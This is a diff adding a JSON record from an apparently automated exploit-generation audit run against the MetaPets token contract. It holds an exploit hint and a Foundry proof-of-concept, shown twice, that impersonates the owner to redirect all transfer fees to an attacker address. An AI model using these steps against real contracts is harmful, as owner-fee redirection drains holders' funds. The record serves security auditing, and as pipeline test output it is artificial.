@@ -1,0 +1,61 @@
+{
+  "project_id": "MetaPets_AuditReport_InterFi",
+  "target_address": "0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d",
+  "finding_id": 0,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d",
+    "vulnerability_type": "Owner Privilege Abuse",
+    "violation_category": "ECONOMIC",
+    "finding_id": 0,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the contract owner",
+        "token_address": null,
+        "min_amount": null
+      },
+      {
+        "type": "token_balance",
+        "description": "Attacker must hold some MetaPets tokens to benefit from fee manipulation",
+        "token_address": "0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d",
+        "min_amount": "1000000000000000"
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": {
+        "target_token": "0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d",
+        "victim_contract": "0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d",
+        "condition": "attacker_balance_increased"
+      },
+      "logic_check": null
+    },
+    "exploit_hint": "As the contract owner, call setMarketingWallet() to set the marketing address to the attacker's address, then setMarketingFeePercent() to a high value (e.g., 100). This will redirect all transaction fees to the attacker's address. Perform token transfers to trigger fee collection. Alternatively, set tax and liquidity fees to zero and exclude the attacker from fees to avoid paying any fees on transfers."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function totalSupply() external view returns (uint256);\n}\n\ninterface MetaPets {\n    function owner() external view returns (address);\n    function balanceOf(address account) external view returns (uint256);\n    function setMarketingWallet(address _add) external;\n    function setMarketingFeePercent(uint256 marketingFee) external;\n    function setTaxFeePercent(uint256 taxFee) external;\n    function setLiquidityFeePercent(uint256 liquidityFee) external;\n    function excludeFromFee(address account) external;\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d;\n    address attacker = address(this);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll impersonate owner in exploit\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        uint256 initialERC20Balance = IERC20(0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d).balanceOf(address(this));\n        // First, get the current owner\n        address owner = MetaPets(TARGET).owner();\n        \n        // Store initial balance for comparison\n        uint256 initialMetaPetsBalance = MetaPets(TARGET).balanceOf(attacker);\n        \n        // Impersonate the owner to call privileged functions\n        vm.startPrank(owner);\n        \n        // 1. Set marketing wallet to attacker address\n        MetaPets(TARGET).setMarketingWallet(attacker);\n        \n        // 2. Set marketing fee to 100%\n        MetaPets(TARGET).setMarketingFeePercent(100);\n        \n        // 3. Set tax and liquidity fees to 0 to avoid other deductions\n        MetaPets(TARGET).setTaxFeePercent(0);\n        MetaPets(TARGET).setLiquidityFeePercent(0);\n        \n        // 4. Exclude attacker from fees (so we don't pay fees when receiving)\n        MetaPets(TARGET).excludeFromFee(attacker);\n        \n        vm.stopPrank();\n        \n        // 5. We need tokens to trigger the fee mechanism\n        // Let's get some tokens from an existing holder\n        // First, find a holder with balance (owner should have tokens)\n        uint256 ownerBalance = MetaPets(TARGET).balanceOf(owner);\n        require(ownerBalance > 0, \"Owner has no tokens\");\n        \n        // 6. Transfer some tokens from owner to a dummy address to trigger fees\n        // We need to impersonate owner to transfer\n        vm.prank(owner);\n        // Transfer to a dummy address (not attacker, since attacker is excluded from fees)\n        address dummy = address(0x123);\n        MetaPets(TARGET).transfer(dummy, 1000 * 10**9); // Transfer 1000 tokens (with 9 decimals)\n        \n        // 7. Check if attacker received marketing fees\n        uint256 finalMetaPetsBalance = MetaPets(TARGET).balanceOf(attacker);\n        \n        // The marketing fee should have been sent to attacker\n        // Since marketing fee is 100%, the entire 1000 tokens should go to attacker\n        // But note: the transfer was from owner to dummy, so marketing fee goes from owner to attacker\n        // So attacker's balance should increase by 1000 tokens\n        assertGt(finalMetaPetsBalance, initialMetaPetsBalance, \"Attacker balance should have increased\");\n        uint256 finalERC20Balance = IERC20(0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d).balanceOf(address(this));\n        assertGt(finalERC20Balance, initialERC20Balance, \"Economic Exploit Failed: No ERC20 profit\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The MetaPets contract has owner-only functions that allow manipulation of fee parameters. The owner can redirect marketing fees to any address and set the fee percentage arbitrarily high. By setting marketing address to attacker and fee to 100%, all transfer amounts would be sent to the attacker as marketing fee, effectively stealing funds from any transfer.",
+      "attack_strategy": "Impersonate the owner, set marketing address to attacker, set marketing fee to 100%, optionally set other fees to zero and exclude attacker from fees to avoid paying fees, then trigger a transfer to collect fees.",
+      "step_by_step_plan": "1. Find the current owner address\n2. Impersonate owner using vm.prank\n3. Set marketing wallet to attacker address\n4. Set marketing fee percent to 100\n5. Set tax and liquidity fees to 0\n6. Exclude attacker from fees\n7. Get some tokens to work with (deal or transfer from another address)\n8. Perform a transfer to trigger fee collection\n9. Verify attacker's balance increased",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function totalSupply() external view returns (uint256);\n}\n\ninterface MetaPets {\n    function owner() external view returns (address);\n    function balanceOf(address account) external view returns (uint256);\n    function setMarketingWallet(address _add) external;\n    function setMarketingFeePercent(uint256 marketingFee) external;\n    function setTaxFeePercent(uint256 taxFee) external;\n    function setLiquidityFeePercent(uint256 liquidityFee) external;\n    function excludeFromFee(address account) external;\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d;\n    address attacker = address(this);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll impersonate owner in exploit\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        uint256 initialERC20Balance = IERC20(0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d).balanceOf(address(this));\n        // First, get the current owner\n        address owner = MetaPets(TARGET).owner();\n        \n        // Store initial balance for comparison\n        uint256 initialMetaPetsBalance = MetaPets(TARGET).balanceOf(attacker);\n        \n        // Impersonate the owner to call privileged functions\n        vm.startPrank(owner);\n        \n        // 1. Set marketing wallet to attacker address\n        MetaPets(TARGET).setMarketingWallet(attacker);\n        \n        // 2. Set marketing fee to 100%\n        MetaPets(TARGET).setMarketingFeePercent(100);\n        \n        // 3. Set tax and liquidity fees to 0 to avoid other deductions\n        MetaPets(TARGET).setTaxFeePercent(0);\n        MetaPets(TARGET).setLiquidityFeePercent(0);\n        \n        // 4. Exclude attacker from fees (so we don't pay fees when receiving)\n        MetaPets(TARGET).excludeFromFee(attacker);\n        \n        vm.stopPrank();\n        \n        // 5. We need tokens to trigger the fee mechanism\n        // Let's get some tokens from an existing holder\n        // First, find a holder with balance (owner should have tokens)\n        uint256 ownerBalance = MetaPets(TARGET).balanceOf(owner);\n        require(ownerBalance > 0, \"Owner has no tokens\");\n        \n        // 6. Transfer some tokens from owner to a dummy address to trigger fees\n        // We need to impersonate owner to transfer\n        vm.prank(owner);\n        // Transfer to a dummy address (not attacker, since attacker is excluded from fees)\n        address dummy = address(0x123);\n        MetaPets(TARGET).transfer(dummy, 1000 * 10**9); // Transfer 1000 tokens (with 9 decimals)\n        \n        // 7. Check if attacker received marketing fees\n        uint256 finalMetaPetsBalance = MetaPets(TARGET).balanceOf(attacker);\n        \n        // The marketing fee should have been sent to attacker\n        // Since marketing fee is 100%, the entire 1000 tokens should go to attacker\n        // But note: the transfer was from owner to dummy, so marketing fee goes from owner to attacker\n        // So attacker's balance should increase by 1000 tokens\n        assertGt(finalMetaPetsBalance, initialMetaPetsBalance, \"Attacker balance should have increased\");\n        uint256 finalERC20Balance = IERC20(0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d).balanceOf(address(this));\n        assertGt(finalERC20Balance, initialERC20Balance, \"Economic Exploit Failed: No ERC20 profit\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 68.22069501876831,
+      "prompt_tokens": 24033,
+      "completion_tokens": 2320,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 68.22590279579163,
+  "total_prompt_tokens": 24033,
+  "total_completion_tokens": 2320,
+  "total_cost": 0.0
+}
